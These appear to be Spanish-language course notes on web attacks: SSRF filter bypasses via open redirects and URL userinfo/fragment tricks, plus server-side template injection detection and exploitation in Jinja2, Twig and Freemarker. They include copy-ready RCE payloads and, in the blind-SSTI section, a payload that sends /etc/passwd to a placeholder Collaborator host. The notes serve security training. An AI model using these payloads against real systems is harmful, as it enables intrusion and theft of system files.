## ① Cierre de SSRF — Bypass con Open Redirect

### Recordatorio rápido de SSRF

```
Atacante → Servidor web → Petición interna a URL
 ↓
El servidor actúa como "navegador interno"
```

> [!important] La clave del SSRF
> El servidor hace la petición por nosotros. Si sanitiza la URL, podemos abusar de una **redirección abierta** dentro de la propia aplicación para saltarnos el filtro.

### El problema

El servidor bloquea peticiones SSRF a `192.168.0.12` (red interna). Pero la misma aplicación tiene una funcionalidad de "siguiente producto" que acepta una URL y redirige sin validación.

### La cadena de explotación

```
1. Filtro SSRF evalúa la URL → ve /product/nextProduct (URL legítima) → OK
 ↓
2. Servidor procesa la petición → sigue la redirección automáticamente
 ↓
3. Redirección apunta a 192.168.0.12/admin → contenido interno devuelto
```

**Payload:**
```
stockApi=/product/nextProduct?path=http://192.168.0.12/admin
```

> [!important] La idea clave
> Un filtro que evalúa la URL inicial pero **no el destino final** de las redirecciones siempre puede ser bypasseado encadenando con cualquier redirección abierta del sistema.

## ② SSRF — Bypass con UserInfo y Fragment (hashtag)

### El problema más jodido

El servidor obliga a que la URL contenga `stock.weelikesoap.net` (whitelist). No acepta nada externo. Pero hay un truco.

### El formato de una URL

```
protocolo://usuario:contraseña@dominio/ruta#fragmento
```

| Parte | Qué es | Ejemplo |
|-------|--------|---------|
| `protocolo` | HTTP o HTTPS | `http://` |
| `userinfo` | Usuario y contraseña (opcional) | `admin:pass@` |
| `host` | Dominio o IP | `dominio.com` |
| `ruta` | Path del recurso | `/admin` |
| `fragmento` | Todo lo que hay después del `#` | `#algo` |

> [!important] El SSH como referencia
> Igual que en SSH: `user@ip`. En HTTP pasa lo mismo: `user@host`. Solo que no se usa porque las webs son públicas. Pero **a nivel de protocolo es válido**.

### El truco del fragmento (hashtag)

El `#` en una URL significa: **"omite todo lo que hay después"**. Pero a nivel de validación, la URL sigue siendo válida.

```
http://localhost#@stock.weelikesoap.net
```

**¿Qué ve el filtro?**
- URL válida ✓
- Contiene `stock.weelikesoap.net` ✓

**¿Qué hace el servidor?**
- Lee el fragmento → omite todo después del `#`
- Accede a `http://localhost/`

### La explotación completa

```
http://localhost#@stock.weelikesoap.net
```

Pero como el `#` a veces necesita ser encodeado en URL:

```
http://localhost%2523@stock.weelikesoap.net
```

> [!warning] Doble encoding
> `%25` = carácter `%` en URL encoding. Entonces `%2523` → `%23` → `#`. El filtro ve `%2523` y no reconoce el patrón.

### ¿Por qué funciona?

```
Validación del servidor:
 1. ¿Es una URL válida? → Sí (tiene protocolo, userinfo, host)
 2. ¿Contiene stock.weelikesoap.net? → Sí (está en el host)
 3. → Pasa la validación ✓

Ejecución real:
 1. El servidor procesa la URL
 2. El fragmento # omite stock.weelikesoap.net
 3. Accede a http://localhost/admin
```

> [!important] Aplicación en auditorías reales
> Esto se ve poco en certificaciones (OSCP, EJPT), pero es **muy útil en auditorías reales** donde hay whitelist en parámetros. Es conocimiento de nivel avanzado.

## ③ Introducción a SSTI — Server-Side Template Injection

### ¿Qué es?

Los motores de plantillas (Jinja2, Twig, Freemarker, Smarty) permiten inyectar variables dinámicas en el HTML antes de enviarlo al navegador.

**Sintaxis típica:**
```
{{ nombre }} → Jinja2 / Twig
${variable} → Freemarker / Smarty
<%= variable %> → ERB (Ruby)
```

### ¿Por qué es vulnerable?

Cuando el desarrollador **concatena** la entrada del usuario directamente en el template:

```python
# Código VULNERABLE
template = "Hola " + request.args.get('nombre')
render_template_string(template)
```

Si el usuario introduce `{{ 7*7 }}`, el motor evalúa la expresión y devuelve `49`.

> [!warning] La diferencia crítica
> **Mostrar** lo que escribe el usuario ≠ **Ejecutar** lo que escribe el usuario. SSTI convierte entrada de usuario en código ejecutado en el servidor.

### SSTI → RCE

```
Entrada de usuario → Motor de plantillas evalúa → Código ejecutado en servidor
 ↓
Si en lugar de {{ 7*7 }} se pone un payload de RCE → acceso completo al sistema
```

## ④ Detección de SSTI — Árbol de decisión

### Paso 1: ¿Hay motor de plantillas?

Inyectar expresiones matemáticas y ver si se evalúan:

| Payload | Resultado si hay motor | Resultado si NO hay motor |
|---------|----------------------|--------------------------|
| `{{7*7}}` | `49` | `{{7*7}}` (texto literal) |
| `${7*7}` | `49` | `${7*7}` (texto literal) |
| `<%= 7*7 %>` | `49` | `<%= 7*7 %>` (texto literal) |

### Paso 2: ¿Qué motor es?

| Prueba | Jinja2 (Python) | Twig (PHP) | Freemarker (Java) |
|--------|-----------------|------------|-------------------|
| `{{7*7}}` | `49` | `49` | Error |
| `{{7*'7'}}` | `7777777` | `49` | Error |
| `${7*7}` | Error | Error | `49` |

> [!important] Identificar ANTES de explotar
> Usar el payload de Jinja2 en Twig da error sin resultado y puede alertar al sistema. Primero identificar, luego explotar.

### Paso 3: Payload según motor

| Motor | Payload para RCE |
|-------|------------------|
| **Jinja2** | `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}` |
| **Twig** | `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}` |
| **Freemarker** | `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}` |

> [!tip] Referencia rápida
> Siempre consultar **PayloadsAllTheThings** o **HackTricks** para el payload exacto según la versión del motor.

## ⑤ Laboratorios SSTI — los 4 casos

### Laboratorio 1 — SSTI básico en Jinja2

**La aplicación:** devuelve mensajes de error que incluyen directamente el valor del parámetro.

**Detección:**
```
{{7*7}} → respuesta contiene "49" → SSTI confirmado en Jinja2
```

**Explotación:**
```
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
```

**¿Qué hace el payload?**
1. `config` → objeto de configuración de la app
2. `.__class__` → accede a la clase
3. `.__init__` → método de inicialización
4. `.__globals__` → variables globales del módulo
5. `['os']` → módulo os de Python
6. `popen('id')` → ejecuta el comando `id`
7. `.read()` → lee el resultado

> [!important] La cadena de clases
> La cadena varía entre versiones de Python y entre aplicaciones. No hay un payload universal.

### Laboratorio 2 — SSTI en Jinja2 sin config

**El problema:** no hay objeto `config` directamente accesible.

**La técnica:** traversar la jerarquía desde un string vacío:

```python
''.__class__.__mro__[1].__subclasses__()
```

**¿Qué hace?**
1. `''` → string vacío (cualquier objeto)
2. `.__class__` → su clase (str)
3. `.__mro__[1]` → clase base object
4. `.__subclasses__()` → **todas** las subclases disponibles

**Resultado:** lista de todas las subclases. Se busca `subprocess.Popen` en esa lista y se invoca con el comando deseado.

> [!important] El índice varía
> El índice de `subprocess.Popen` en la lista cambia entre entornos. Hay que iterar o buscarlo con PayloadsAllTheThings.

### Laboratorio 3 — SSTI en Freemarker

**El motor:** Freemarker (Java, muy común en banca y sector público en España).

**Payload:**
```
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
```

**¿Qué hace?**
1. `<#assign ex=...>` → asigna una instancia de Execute a la variable `ex`
2. `?new()` → crea la instancia
3. `${ex("id")}` → ejecuta el comando `id`

> [!important] Relevancia laboral
> Freemarker aparece frecuentemente en aplicaciones Java de banca y sector público. Conocer este payload tiene valor directo en el mercado laboral español.

### Laboratorio 4 — SSTI con salida en código

**El problema:** la expresión inyectada aparece dentro de un bloque `<script>` en el HTML, no en texto visible.

**¿Qué cambia?**
- La vulnerabilidad es la misma
- Pero hay que inspeccionar el **código fuente** de la respuesta, no el HTML renderizado
- El payload y la técnica son idénticos

> [!warning] No confiarse
> Si no ves el resultado en la página, no asumas que no hay SSTI. Siempre inspeccionar el código fuente de la respuesta.

## ⑥ SSTI blind — cuando no hay reflejo

### El problema

La expresión evaluada **no aparece** en ningún lugar del response (ni HTML visible ni código fuente).

### La detección

Igual que SSRF ciego: con **Burp Collaborator**.

```
1. Inyectar payload que haga petición HTTP al Collaborator
2. Si la petición llega al Collaborator → SSTI confirmado
```

**Payload ejemplo:**
```
{{config.__class__.__init__.__globals__['os'].popen('curl http://TU_COLLABORATOR').read()}}
```

### Exfiltración de datos

En SSTI ciego se usan técnicas **out-of-band**:
- El payload ejecuta un comando que hace `curl` o `wget` a la URL del Collaborator
- El output del comando se incluye en la URL como parámetro

```
{{config.__class__.__init__.__globals__['os'].popen('curl http://COLLABORATOR/?dato=' + open('/etc/passwd').read()).read()}}
```

## ⑦ Resumen: SSRF avanzado y SSTI

### SSRF — Los 3 niveles de dificultad

| Nivel | Tipo | Bypass |
|-------|------|--------|
| **Fácil** | Sin validación | `http://localhost/admin` directo |
| **Medio** | Blacklist | Abreviar IP, URL encoding, open redirect |
| **Difícil** | Whitelist | UserInfo + Fragment (`#@`) con doble encoding |

### SSTI — Flujo completo

```
1. Detectar → inyectar {{7*7}} o ${7*7}
 ↓
2. Identificar motor → Jinja2, Twig, Freemarker, etc.
 ↓
3. Buscar payload → PayloadsAllTheThings / HackTricks
 ↓
4. Confirmar RCE → ejecutar comando id, whoami, etc.
 ↓
5. Escalar → shell reversa, lectura de ficheros, etc.
```

### SSTI vs otras inyecciones

| Inyección | Qué se inyecta | Resultado |
|-----------|---------------|-----------|
| Path Traversal | Rutas de ficheros | Lectura de archivos |
| XXE | Entidades XML | Lectura de archivos / SSRF |
| SSRF | URLs | Acceso a red interna |
| SQL Injection | Código SQL | Acceso a base de datos |
| **SSTI** | **Código en motor de plantillas** | **RCE directo** |

> [!important] SSTI es la escalada más directa
> De todas las inyecciones vistas, SSTI es la que lleva directamente a RCE sin pasar por otras fases. Por eso es la más peligrosa.
